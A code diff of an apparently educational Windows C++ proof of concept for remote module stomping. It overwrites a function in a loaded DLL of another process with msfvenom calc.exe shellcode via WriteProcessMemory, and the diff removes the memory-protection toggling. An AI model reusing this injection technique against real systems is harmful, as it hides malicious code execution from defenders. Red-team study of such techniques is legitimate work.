@@ -2,7 +2,7 @@
 * remote module stomping: locate a sacrificial DLL in the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
 *                        & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
-* compile: cl.exe remote-stomp.cpp ..\includes\peb-eat-utils.cpp ..\includes\utils.cpp /W0 /D"UNICODE" /D"_UNICODE"
+* compile: cl.exe remote-stomp.cpp ..\includes\peb-eat-utils.cpp ..\includes\utils.cpp /W0
 */
 #include <windows.h>
 #include <stdio.h>
@@ -78,45 +78,21 @@ int main(int argc, char *argv[]) {
 
     printf("[*] Target DLL base located at: : 0x%016llx\n", targetModuleBase);
     
-    // Finding the .text section bounds, are we going to do anything with this?
-    IMAGE_SECTION_INFO textSection = { 0 };
-    if (GetRemoteModuleSection(pHandle, targetModuleBase, ".text", &textSection)) {
-        printf("[+] Found .text Section at: 0x%p (Size: %lu bytes)\n", 
-            textSection.VirtualAddress, textSection.SizeOfRawData);
-    } else {
-        printf("No .text Section found.\n");
-    }
-
     LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, "FileTimeToSystemTime");  
     if (bufferAddress == NULL) {
         printf("[ERROR] Failed to locate target function FileTimeToSystemTime! Error: %lu\n", pid, GetLastError());
         return -1;
     }
-    printf("[*] Target ntdll.dll!FileTimeToSystemTime located at: : 0x%016llx\n", bufferAddress);
+    printf("[*] Target ntdll.dll!FileTimeToSystemTime located at: 0x%016llx\n", bufferAddress);
 
-    printf("[*] Flipping memory protection to RW.\n");
-    // Update the memory protection value to RW
-    DWORD lpOldProtect = NULL;
-    BOOL updateMemoryProtection = VirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_READWRITE, &lpOldProtect);
-    if(updateMemoryProtection == false) {
-        printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
-        return -1;
-    }
+    printf("[*] Press Enter to write the shellcode to the buffer address: ");
+    getchar();
 
     printf("[*] Writing to buffer.\n");
     // Write the shellcode to the block of memory that we located`
     BOOL writeShellcode = WriteProcessMemory(pHandle, bufferAddress, buf, sizeof buf, NULL);
     if(writeShellcode == false) {
         printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
-        return -1;
-    }
-
-    printf("[*] Flipping memory protection back to RX.\n");
-    // Update the memory protection value from RW to RX
-    lpOldProtect = NULL;
-    updateMemoryProtection = VirtualProtectEx(pHandle, bufferAddress, sizeof buf, PAGE_EXECUTE_READ, &lpOldProtect);
-    if (updateMemoryProtection == false) {
-        printf("[ERROR] Failed to update memory protection (updating from RW to RWX)! Using addresss: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
         return -1;
     }
 
